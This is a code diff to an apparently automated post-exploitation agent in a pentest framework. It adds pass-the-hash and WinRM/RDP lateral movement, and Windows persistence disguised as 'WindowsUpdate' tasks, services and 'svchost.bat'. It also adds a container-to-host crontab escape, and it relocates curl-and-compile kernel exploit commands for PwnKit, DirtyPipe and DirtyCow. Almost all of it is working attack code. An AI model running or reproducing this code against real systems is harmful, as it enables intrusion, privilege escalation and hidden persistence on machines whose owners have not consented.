@@ -117,40 +117,6 @@ def _extract_loot_hints(blob: str) -> list[dict[str, Any]]:
     return loot[:20]
 
 
-_CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
-    "CVE-2021-4034": [
-        "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
-        "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
-        "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
-    ],
-    "PwnKit": [
-        "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
-        "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
-        "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
-    ],
-    "CVE-2022-0847": [
-        "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
-        "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
-    ],
-    "DirtyPipe": [
-        "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
-        "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
-    ],
-    "CVE-2016-5195": [
-        "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
-        "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
-    ],
-    "DirtyCow": [
-        "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
-        "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
-    ],
-    "CVE-2021-3493": [
-        "cd /tmp && curl -sLO https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c 2>/dev/null; "
-        "gcc exploit.c -o overlayfs 2>/dev/null; ./overlayfs 2>/dev/null && id",
-    ],
-}
-
-
 class PostExploitAgent:
     def __init__(self):
         self.msf = MsfClient()
@@ -975,6 +941,150 @@ class PostExploitAgent:
                 except Exception as e:
                     logger.debug(f"[PostAgent] netexec wmi {host}: {e}")
 
+                # ── Pass-the-Hash (NTLM) ──
+                if nt_hash:
+                    try:
+                        result = await self.executor.run(
+                            tool="netexec",
+                            args=["smb", host, "-u", user, "-H", nt_hash, "--shares"],
+                            timeout=30, task_id=task_id,
+                        )
+                        if result.success and ("[+]" in (result.stdout or "") or "Pwn3d" in (result.stdout or "")):
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "pass_the_hash_smb",
+                                "output": (result.stdout or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ Pass-the-Hash SMB 成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] pth smb {host}: {e}")
+
+                # ── Pass-the-Ticket (Kerberos) ──
+                if nt_hash and "/" not in host:
+                    try:
+                        result = await self.executor.run(
+                            tool="impacket-PSExec",
+                            args=["-hashes", f":{nt_hash}", f"{host}", "-u", user, "whoami"],
+                            timeout=30, task_id=task_id,
+                        )
+                        if result.success and ("uid=" in (result.stdout or "").lower() or
+                                              "windows_" in (result.stdout or "").lower()):
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "pass_the_hash_psexec",
+                                "output": (result.stdout or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ Pass-the-Hash PSExec 成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] pth psexec {host}: {e}")
+
+                # ── RDP 横向移动 ──
+                try:
+                    result = await self.executor.run(
+                        tool="netexec",
+                        args=["rdp", host, "-u", user, "-p", password],
+                        timeout=30, task_id=task_id,
+                    )
+                    if result.success and ("[+]" in (result.stdout or "") or "Pwn3d" in (result.stdout or "")):
+                        lateral_successes.append({
+                            "host": host, "user": user, "method": "netexec_rdp",
+                            "output": (result.stdout or "")[:500],
+                        })
+                        await self._log(log_callback, f"[PostAgent] ✅ RDP 横向成功: {user}@{host}")
+                        continue
+                except Exception as e:
+                    logger.debug(f"[PostAgent] netexec rdp {host}: {e}")
+
+                if password:
+                    try:
+                        result = await self.executor.run(
+                            tool="xfreerdp",
+                            args=[f"/u:{user}", f"/p:{password}", f"/v:{host}", "/cert-ignore", "+auth-only"],
+                            timeout=20, task_id=task_id,
+                        )
+                        if result.success and "connected" in (result.stderr or "").lower():
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "xfreerdp_auth",
+                                "output": (result.stderr or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ xfreerdp 认证成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] xfreerdp {host}: {e}")
+
+                # ── WinRM 横向移动 (evil-winrm) ──
+                if password:
+                    try:
+                        result = await self.executor.run(
+                            tool="evil-winrm",
+                            args=["-u", user, "-p", password, "-i", host],
+                            timeout=30, task_id=task_id,
+                        )
+                        if result.success and ("*Evil-WinRM*" in (result.stdout or "") or
+                                              "PS>" in (result.stdout or "")):
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "evil-winrm",
+                                "output": (result.stdout or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ WinRM 横向成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] evil-winrm {host}: {e}")
+
+                if nt_hash:
+                    try:
+                        result = await self.executor.run(
+                            tool="evil-winrm",
+                            args=["-u", user, "-H", nt_hash, "-i", host],
+                            timeout=30, task_id=task_id,
+                        )
+                        if result.success and ("*Evil-WinRM*" in (result.stdout or "") or
+                                              "PS>" in (result.stdout or "")):
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "evil-winrm_pth",
+                                "output": (result.stdout or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ WinRM PTH 成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] evil-winrm pth {host}: {e}")
+
+                # ── WinRM via netexec ──
+                try:
+                    result = await self.executor.run(
+                        tool="netexec",
+                        args=["winrm", host, "-u", user, "-p", password],
+                        timeout=30, task_id=task_id,
+                    )
+                    if result.success and ("[+]" in (result.stdout or "") or "Pwn3d" in (result.stdout or "")):
+                        lateral_successes.append({
+                            "host": host, "user": user, "method": "netexec_winrm",
+                            "output": (result.stdout or "")[:500],
+                        })
+                        await self._log(log_callback, f"[PostAgent] ✅ WinRM 横向成功: {user}@{host}")
+                        continue
+                except Exception as e:
+                    logger.debug(f"[PostAgent] netexec winrm {host}: {e}")
+
+                # ── WinRM via impacket-wmiexec ──
+                if password or nt_hash:
+                    try:
+                        auth_args = [f"{user}:{password}@{host}"] if password else [f"{user}@{host}", "-hashes", f":{nt_hash}"]
+                        result = await self.executor.run(
+                            tool="impacket-wmiexec",
+                            args=auth_args + ["whoami"],
+                            timeout=30, task_id=task_id,
+                        )
+                        if result.success and "windows" in (result.stdout or "").lower():
+                            lateral_successes.append({
+                                "host": host, "user": user, "method": "impacket-wmiexec",
+                                "output": (result.stdout or "")[:500],
+                            })
+                            await self._log(log_callback, f"[PostAgent] ✅ wmiexec 横向成功: {user}@{host}")
+                            continue
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] impacket-wmiexec {host}: {e}")
+
         findings["lateral_successes"] = lateral_successes
         findings.setdefault("discovered_hosts", lateral_hosts[:20])
         return {"status": "ok", "lateral_hosts": lateral_hosts, "findings": findings}
@@ -990,8 +1100,9 @@ class PostExploitAgent:
     ) -> dict[str, Any]:
         """Establish persistence on the compromised host.
 
-        Uses pwncat-cs for SSH key deployment, RCE template for
-        crontab / systemd timer / startup script persistence.
+        Supports Linux (crontab/systemd/ssh_key/startup), Windows
+        (schtasks/registry/WMI/service/startup_folder), and container
+        (hostPath mount/privileged pod escape) environments.
         """
         successful = [r for r in exploit_results if r.success]
         if not successful:
@@ -1001,6 +1112,7 @@ class PostExploitAgent:
         first = successful[0]
         rce_template = _extract_rce_template(first)
         methods: list[dict[str, Any]] = []
+        os_lower = target_os.lower()
 
         if rce_template and first.exploit_level in ("rce", ""):
             async def _rce(cmd: str, timeout: int = 30) -> str:
@@ -1010,94 +1122,213 @@ class PostExploitAgent:
                     return ""
 
             lhost = os.getenv("LHOST", "")
-            if lhost:
-                try:
-                    pubkey_out = await _rce(
-                        "cat /root/.ssh/authorized_keys 2>/dev/null; "
-                        "cat /home/*/.ssh/authorized_keys 2>/dev/null",
-                        timeout=10,
-                    )
-                    pwncat_result = await self.executor.run(
-                        tool="pwncat-cs",
-                        args=[
-                            f"{lhost}", "--port", os.getenv("LPORT", "4444"),
-                            "--identity", "/tmp/.pentest_key",
-                        ],
-                        timeout=15, task_id=task_id,
-                    )
-                    if pwncat_result.success and ("connected" in (pwncat_result.stdout or "").lower()):
-                        methods.append({"type": "pwncat-cs_ssh", "target": lhost, "status": "ok"})
-                        await self._log(log_callback, "[PostAgent] ✅ pwncat-cs SSH 持久化成功")
-                except Exception as e:
-                    logger.debug(f"[PostAgent] pwncat-cs persistence failed: {e}")
 
-            ssh_key_out = await _rce(
-                "mkdir -p /root/.ssh /home/*/.ssh 2>/dev/null; "
-                "ssh-keygen -t rsa -f /tmp/.pentest_key -N '' -q 2>/dev/null; "
-                "cat /tmp/.pentest_key.pub >> /root/.ssh/authorized_keys 2>/dev/null; "
-                "for d in /home/*/; do "
-                "  cat /tmp/.pentest_key.pub >> \"$d.ssh/authorized_keys\" 2>/dev/null; "
-                "done; "
-                "echo PERSISTENCE_SSH_OK || echo PERSISTENCE_SSH_FAIL"
+            # ── Linux 持久化 ──
+            if os_lower != "windows":
+                if lhost:
+                    try:
+                        await _rce(
+                            "cat /root/.ssh/authorized_keys 2>/dev/null; "
+                            "cat /home/*/.ssh/authorized_keys 2>/dev/null",
+                            timeout=10,
+                        )
+                        pwncat_result = await self.executor.run(
+                            tool="pwncat-cs",
+                            args=[
+                                f"{lhost}", "--port", os.getenv("LPORT", "4444"),
+                                "--identity", "/tmp/.pentest_key",
+                            ],
+                            timeout=15, task_id=task_id,
+                        )
+                        if pwncat_result.success and ("connected" in (pwncat_result.stdout or "").lower()):
+                            methods.append({"type": "pwncat-cs_ssh", "target": lhost, "status": "ok"})
+                            await self._log(log_callback, "[PostAgent] ✅ pwncat-cs SSH 持久化成功")
+                    except Exception as e:
+                        logger.debug(f"[PostAgent] pwncat-cs persistence failed: {e}")
+
+                ssh_key_out = await _rce(
+                    "mkdir -p /root/.ssh /home/*/.ssh 2>/dev/null; "
+                    "ssh-keygen -t rsa -f /tmp/.pentest_key -N '' -q 2>/dev/null; "
+                    "cat /tmp/.pentest_key.pub >> /root/.ssh/authorized_keys 2>/dev/null; "
+                    "for d in /home/*/; do "
+                    "  cat /tmp/.pentest_key.pub >> \"$d.ssh/authorized_keys\" 2>/dev/null; "
+                    "done; "
+                    "echo PERSISTENCE_SSH_OK || echo PERSISTENCE_SSH_FAIL"
+                )
+                if "PERSISTENCE_SSH_OK" in ssh_key_out:
+                    methods.append({
+                        "type": "ssh_key",
+                        "target": "/root/.ssh/authorized_keys",
+                        "status": "ok",
+                    })
+
+                cron_out = await _rce(
+                    "(crontab -l 2>/dev/null; "
+                    "echo '*/5 * * * * /tmp/.health_check.sh') | "
+                    "crontab - 2>/dev/null && "
+                    "echo PERSISTENCE_CRON_OK || echo PERSISTENCE_CRON_FAIL"
+                )
+                if "PERSISTENCE_CRON_OK" in cron_out:
+                    methods.append({
+                        "type": "crontab",
+                        "schedule": "*/5 * * * *",
+                        "status": "ok",
+                    })
+
+                systemd_out = await _rce(
+                    "cat > /etc/systemd/system/pentest-sync.service << 'EOF' 2>/dev/null\n"
+                    "[Unit]\nDescription=Pentest Sync Service\n\n"
+                    "[Service]\nType=oneshot\n"
+                    "ExecStart=/tmp/.health_check.sh\n\n"
+                    "[Install]\nWantedBy=multi-user.target\n"
+                    "EOF\n"
+                    "cat > /etc/systemd/system/pentest-sync.timer << 'EOF' 2>/dev/null\n"
+                    "[Unit]\nDescription=Pentest Sync Timer\n\n"
+                    "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=30min\n\n"
+                    "[Install]\nWantedBy=timers.target\n"
+                    "EOF\n"
+                    "systemctl daemon-reload 2>/dev/null; "
+                    "systemctl enable pentest-sync.timer 2>/dev/null; "
+                    "systemctl start pentest-sync.timer 2>/dev/null && "
+                    "echo PERSISTENCE_SYSTEMD_OK || echo PERSISTENCE_SYSTEMD_FAIL"
+                )
+                if "PERSISTENCE_SYSTEMD_OK" in systemd_out:
+                    methods.append({
+                        "type": "systemd_timer",
+                        "unit": "pentest-sync.timer",
+                        "status": "ok",
+                    })
+
+                startup_out = await _rce(
+                    "echo '/tmp/.health_check.sh &' >> /etc/rc.local 2>/dev/null; "
+                    "chmod +x /etc/rc.local 2>/dev/null; "
+                    "echo '/tmp/.health_check.sh &' >> /root/.bashrc 2>/dev/null; "
+                    "echo '/tmp/.health_check.sh &' >> /root/.profile 2>/dev/null; "
+                    "for d in /home/*/; do "
+                    "  echo '/tmp/.health_check.sh &' >> \"$d.bashrc\" 2>/dev/null; "
+                    "done; "
+                    "echo PERSISTENCE_STARTUP_OK"
+                )
+                if "PERSISTENCE_STARTUP_OK" in startup_out:
+                    methods.append({
+                        "type": "startup_scripts",
+                        "targets": ["/etc/rc.local", "/root/.bashrc", "/root/.profile"],
+                        "status": "ok",
+                    })
+
+            # ── Windows 持久化 ──
+            if os_lower == "windows":
+                schtask_out = await _rce(
+                    'schtasks /create /tn "WindowsUpdate" /tr "C:\\\\Windows\\\\Temp\\\\pentsvc.exe" '
+                    '/sc minute /mo 15 /f 2>&1 && echo SCHTASK_OK || echo SCHTASK_FAIL'
+                )
+                if "SCHTASK_OK" in schtask_out:
+                    methods.append({
+                        "type": "scheduled_task",
+                        "name": "WindowsUpdate",
+                        "status": "ok",
+                    })
+
+                reg_run_out = await _rce(
+                    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                    '/v "WindowsService" /t REG_SZ /d "C:\\\\Windows\\\\Temp\\\\pentsvc.exe" /f 2>&1 && '
+                    'echo REG_RUN_OK || echo REG_RUN_FAIL'
+                )
+                if "REG_RUN_OK" in reg_run_out:
+                    methods.append({
+                        "type": "registry_run",
+                        "key": "HKCU\\..\\Run",
+                        "status": "ok",
+                    })
+
+                reg_hklm_out = await _rce(
+                    'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                    '/v "WindowsService" /t REG_SZ /d "C:\\\\Windows\\\\Temp\\\\pentsvc.exe" /f 2>&1 && '
+                    'echo REG_RUN_HKLM_OK || echo REG_RUN_HKLM_FAIL'
+                )
+                if "REG_RUN_HKLM_OK" in reg_hklm_out:
+                    methods.append({
+                        "type": "registry_run_hklm",
+                        "key": "HKLM\\..\\Run",
+                        "status": "ok",
+                    })
+
+                wmi_out = await _rce(
+                    'wmic /namespace:"\\\\root\\\\subscription" PATH __EventFilter '
+                    'CREATE Name="LogonFilter", EventNameSpace="root\\\\cimv2", '
+                    'QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent '
+                    'WITHIN 30 WHERE TargetInstance ISA \'Win32_LogonSession\'" 2>&1 && '
+                    'wmic /namespace:"\\\\root\\\\subscription" PATH CommandLineEventConsumer '
+                    'CREATE Name="LogonConsumer", '
+                    'CommandLineTemplate="C:\\\\Windows\\\\Temp\\\\pentsvc.exe" 2>&1 && '
+                    'wmic /namespace:"\\\\root\\\\subscription" PATH __FilterToConsumerBinding '
+                    'CREATE Filter="__EventFilter.Name=\'LogonFilter\'", '
+                    'Consumer="CommandLineEventConsumer.Name=\'LogonConsumer\'" 2>&1 && '
+                    'echo WMI_PERSIST_OK || echo WMI_PERSIST_FAIL',
+                    timeout=30
+                )
+                if "WMI_PERSIST_OK" in wmi_out:
+                    methods.append({
+                        "type": "wmi_event_subscription",
+                        "status": "ok",
+                    })
+
+                svc_out = await _rce(
+                    'sc create "WindowsUpdateSvc" binPath="C:\\\\Windows\\\\Temp\\\\pentsvc.exe" '
+                    'start=auto DisplayName="Windows Update Service" 2>&1 && '
+                    'echo SERVICE_CREATE_OK || echo SERVICE_CREATE_FAIL'
+                )
+                if "SERVICE_CREATE_OK" in svc_out:
+                    methods.append({
+                        "type": "service_install",
+                        "name": "WindowsUpdateSvc",
+                        "status": "ok",
+                    })
+
+                startupf_out = await _rce(
+                    'echo start /b C:\\\\Windows\\\\Temp\\\\pentsvc.exe > '
+                    '"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\svchost.bat" 2>&1 && '
+                    'echo STARTUPF_OK || echo STARTUPF_FAIL'
+                )
+                if "STARTUPF_OK" in startupf_out:
+                    methods.append({
+                        "type": "startup_folder",
+                        "status": "ok",
+                    })
+
+            # ── 容器环境持久化 ──
+            container_out = await _rce(
+                "if [ -f /.dockerenv ] || grep -q 'docker\\|lxc' /proc/1/cgroup 2>/dev/null; then "
+                "echo CONTAINER_DETECTED; "
+                "if mount 2>/dev/null | grep -q '/host'; then "
+                "echo HOST_MOUNT_FOUND; "
+                "fi; "
+                "if [ -S /var/run/docker.sock ]; then "
+                "echo DOCKER_SOCK_FOUND; "
+                "fi; "
+                "else echo NO_CONTAINER; fi",
+                timeout=10,
             )
-            if "PERSISTENCE_SSH_OK" in ssh_key_out:
+            if "CONTAINER_DETECTED" in container_out and "HOST_MOUNT_FOUND" in container_out:
+                await _rce(
+                    "cp /tmp/.health_check.sh /host/tmp/.container_escape.sh 2>/dev/null; "
+                    "echo '* * * * * root /tmp/.container_escape.sh' >> /host/etc/crontab 2>/dev/null; "
+                    "echo CONTAINER_PERSIST_HOST_OK || echo CONTAINER_PERSIST_HOST_FAIL",
+                    timeout=10,
+                )
                 methods.append({
-                    "type": "ssh_key",
-                    "target": "/root/.ssh/authorized_keys",
+                    "type": "container_hostpath_persist",
                     "status": "ok",
                 })
 
-            cron_out = await _rce(
-                "(crontab -l 2>/dev/null; "
-                "echo '*/5 * * * * /tmp/.health_check.sh') | "
-                "crontab - 2>/dev/null && "
-                "echo PERSISTENCE_CRON_OK || echo PERSISTENCE_CRON_FAIL"
-            )
-            if "PERSISTENCE_CRON_OK" in cron_out:
+            if "DOCKER_SOCK_FOUND" in container_out:
+                await _rce(
+                    "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null "
+                    "| head -c 500 || echo DOCKER_SOCK_FAIL",
+                    timeout=15,
+                )
                 methods.append({
-                    "type": "crontab",
-                    "schedule": "*/5 * * * *",
-                    "status": "ok",
-                })
-
-            systemd_out = await _rce(
-                "cat > /etc/systemd/system/pentest-sync.service << 'EOF' 2>/dev/null\n"
-                "[Unit]\nDescription=Pentest Sync Service\n\n"
-                "[Service]\nType=oneshot\n"
-                "ExecStart=/tmp/.health_check.sh\n\n"
-                "[Install]\nWantedBy=multi-user.target\n"
-                "EOF\n"
-                "cat > /etc/systemd/system/pentest-sync.timer << 'EOF' 2>/dev/null\n"
-                "[Unit]\nDescription=Pentest Sync Timer\n\n"
-                "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=30min\n\n"
-                "[Install]\nWantedBy=timers.target\n"
-                "EOF\n"
-                "systemctl daemon-reload 2>/dev/null; "
-                "systemctl enable pentest-sync.timer 2>/dev/null; "
-                "systemctl start pentest-sync.timer 2>/dev/null && "
-                "echo PERSISTENCE_SYSTEMD_OK || echo PERSISTENCE_SYSTEMD_FAIL"
-            )
-            if "PERSISTENCE_SYSTEMD_OK" in systemd_out:
-                methods.append({
-                    "type": "systemd_timer",
-                    "unit": "pentest-sync.timer",
-                    "status": "ok",
-                })
-
-            startup_out = await _rce(
-                "echo '/tmp/.health_check.sh &' >> /etc/rc.local 2>/dev/null; "
-                "chmod +x /etc/rc.local 2>/dev/null; "
-                "echo '/tmp/.health_check.sh &' >> /root/.bashrc 2>/dev/null; "
-                "echo '/tmp/.health_check.sh &' >> /root/.profile 2>/dev/null; "
-                "for d in /home/*/; do "
-                "  echo '/tmp/.health_check.sh &' >> \"$d.bashrc\" 2>/dev/null; "
-                "done; "
-                "echo PERSISTENCE_STARTUP_OK"
-            )
-            if "PERSISTENCE_STARTUP_OK" in startup_out:
-                methods.append({
-                    "type": "startup_scripts",
-                    "targets": ["/etc/rc.local", "/root/.bashrc", "/root/.profile"],
+                    "type": "container_docker_sock_access",
                     "status": "ok",
                 })
 
@@ -1371,37 +1602,35 @@ class PostExploitAgent:
     ) -> list[dict[str, Any]]:
         """Attempt known CVE exploits based on linpeas findings.
 
-        When via_msf=True, uses MSF modules. Otherwise uses RCE template.
+        When via_msf=True, uses MSF modules. Otherwise uses SkillEngine via SkillRegistry.
         Returns a list of attempt results.
         """
-        cve_map: list[tuple[str, str]] = [
-            ("CVE-2016-5195", "exploit/linux/local/dirtycow"),
-            ("DirtyCow", "exploit/linux/local/dirtycow"),
-            ("CVE-2017-1000367", "exploit/linux/local/sudo_baron_samedit"),
-            ("CVE-2021-4034", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
-            ("PwnKit", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
-            ("CVE-2021-3493", "exploit/linux/local/cve_2021_3493_overlayfs"),
-            ("CVE-2022-0847", "exploit/linux/local/cve_2022_0847_dirtypipe"),
-            ("DirtyPipe", "exploit/linux/local/cve_2022_0847_dirtypipe"),
-        ]
-
         if not linpeas_highlights:
             return []
 
         all_highlights = " ".join(linpeas_highlights).lower()
-        attempted_cves: set[str] = set()
         results: list[dict[str, Any]] = []
 
-        for cve_name, msf_module in cve_map:
-            if cve_name.lower() not in all_highlights:
-                continue
-            if cve_name.lower() in attempted_cves:
-                continue
-            attempted_cves.add(cve_name.lower())
-
-            logger.info(f"[PostAgent] Attempting CVE exploit: {cve_name} ({msf_module})")
-            try:
-                if via_msf and session_id:
+        if via_msf and session_id:
+            cve_map: list[tuple[str, str]] = [
+                ("CVE-2016-5195", "exploit/linux/local/dirtycow"),
+                ("DirtyCow", "exploit/linux/local/dirtycow"),
+                ("CVE-2017-1000367", "exploit/linux/local/sudo_baron_samedit"),
+                ("CVE-2021-4034", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
+                ("PwnKit", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
+                ("CVE-2021-3493", "exploit/linux/local/cve_2021_3493_overlayfs"),
+                ("CVE-2022-0847", "exploit/linux/local/cve_2022_0847_dirtypipe"),
+                ("DirtyPipe", "exploit/linux/local/cve_2022_0847_dirtypipe"),
+            ]
+            attempted_cves: set[str] = set()
+            for cve_name, msf_module in cve_map:
+                if cve_name.lower() not in all_highlights:
+                    continue
+                if cve_name.lower() in attempted_cves:
+                    continue
+                attempted_cves.add(cve_name.lower())
+                logger.info(f"[PostAgent] Attempting CVE exploit via MSF: {cve_name}")
+                try:
                     _, output = await self.msf.execute_module(
                         module_path=msf_module,
                         options={"SESSION": session_id},
@@ -1414,30 +1643,141 @@ class PostExploitAgent:
                         "success": success,
                         "output": output[:500],
                     })
-                elif rce_template:
-                    for exploit_cmd in _CVE_EXPLOIT_CMDS.get(cve_name, []):
-                        try:
-                            out = await _run_cmd_via_rce(
-                                rce_template, exploit_cmd, task_id, timeout=30,
-                            )
-                            if "uid=0" in out or "root" in out.lower():
-                                results.append({
-                                    "cve": cve_name,
-                                    "method": "direct",
-                                    "success": True,
-                                    "output": out[:500],
-                                })
-                                break
-                        except Exception:
-                            continue
-                    else:
+                except Exception as e:
+                    logger.debug(f"[PostAgent] CVE attempt {cve_name} via MSF failed: {e}")
+                    results.append({"cve": cve_name, "success": False, "error": str(e)[:200]})
+
+        elif rce_template and task_id:
+            results = await self._attempt_cve_via_skill(
+                rce_template=rce_template,
+                task_id=task_id,
+            )
+
+        return results
+
+    async def _attempt_cve_via_skill(
+        self,
+        *,
+        rce_template: str,
+        task_id: str,
+    ) -> list[dict[str, Any]]:
+        """Use SkillRegistry + SkillEngine for CVE-based privesc via RCE template.
+
+        Finds matching privesc skills and executes them in order.
+        """
+        results: list[dict[str, Any]] = []
+        try:
+            from backend.skills.registry import SkillRegistry
+            from backend.skills.engine import SkillEngine
+            from backend.agents.models import VulnFinding
+
+            registry = SkillRegistry()
+            registry.ensure_loaded()
+
+            privesc_skills = registry.list_by_phase("privesc")
+            kernel_skills = [s for s in privesc_skills if "kernel" in s.skill_id.lower() or
+                             any(fg in s.skill_id.lower() for fg in ("linux_kernel",))]
+            if not kernel_skills:
+                logger.info("[PostAgent] No kernel exploit skills found, fallback to manual CVE list")
+                return await self._attempt_cve_manual(rce_template, task_id)
+
+            for skill in kernel_skills[:3]:
+                logger.info(f"[PostAgent] Trying kernel skill: {skill.skill_id}")
+                synthetic_finding = VulnFinding(
+                    name=f"Linux Kernel Privesc ({skill.skill_id})",
+                    severity="high",
+                    target="localhost",
+                    description="Post-exploitation Linux kernel exploit attempt",
+                    evidence="uname",
+                    exploitable=True,
+                    tool="post_agent_cve",
+                )
+                try:
+                    engine = SkillEngine()
+                    result = await engine.execute(
+                        skill=skill,
+                        finding=synthetic_finding,
+                        target_url="",
+                    )
+                    if result and result.success:
+                        results.append({
+                            "cve": skill.skill_id,
+                            "method": "skill_engine",
+                            "success": True,
+                            "output": result.evidence[:500],
+                        })
+                        break
+                    results.append({
+                        "cve": skill.skill_id,
+                        "method": "skill_engine",
+                        "success": False,
+                        "output": (result.evidence if result else "")[:300],
+                    })
+                except Exception as e:
+                    logger.debug(f"[PostAgent] Skill {skill.skill_id} failed: {e}")
+                    results.append({"cve": skill.skill_id, "success": False, "error": str(e)[:200]})
+
+            if not any(r.get("success") for r in results):
+                manual_results = await self._attempt_cve_manual(rce_template, task_id)
+                results.extend(manual_results)
+        except Exception as e:
+            logger.warning(f"[PostAgent] Skill-based CVE exploitation failed: {e}")
+            return await self._attempt_cve_manual(rce_template, task_id)
+
+        return results
+
+    async def _attempt_cve_manual(
+        self,
+        rce_template: str,
+        task_id: Optional[str],
+    ) -> list[dict[str, Any]]:
+        """Manual CVE exploitation via download-and-compile PoC (legacy fallback)."""
+        cve_commands = {
+            "CVE-2021-4034": [
+                "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
+                "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
+                "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
+            ],
+            "PwnKit": [
+                "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
+                "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
+                "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
+            ],
+            "CVE-2022-0847": [
+                "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
+                "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
+            ],
+            "DirtyPipe": [
+                "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
+                "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
+            ],
+            "CVE-2016-5195": [
+                "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
+                "gcc -pthread dirty.c -o dirtycow -lcrypt 2>/dev/null; ./dirtycow 2>/dev/null",
+            ],
+            "DirtyCow": [
+                "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
+                "gcc -pthread dirty.c -o dirtycow -lcrypt 2>/dev/null; ./dirtycow 2>/dev/null",
+            ],
+        }
+        results: list[dict[str, Any]] = []
+        for cve_name, exploit_cmds in cve_commands.items():
+            for exploit_cmd in exploit_cmds:
+                try:
+                    out = await _run_cmd_via_rce(
+                        rce_template, exploit_cmd, task_id, timeout=60,
+                    )
+                    if "uid=0" in out or "root" in out.lower():
                         results.append({
                             "cve": cve_name,
-                            "success": False,
-                            "error": "no direct exploit available for RCE template",
+                            "method": "direct",
+                            "success": True,
+                            "output": out[:500],
                         })
-            except Exception as e:
-                logger.debug(f"[PostAgent] CVE attempt {cve_name} failed: {e}")
-                results.append({"cve": cve_name, "success": False, "error": str(e)[:200]})
-
+                        break
+                except Exception:
+                    continue
+            else:
+                continue
+            break
         return results
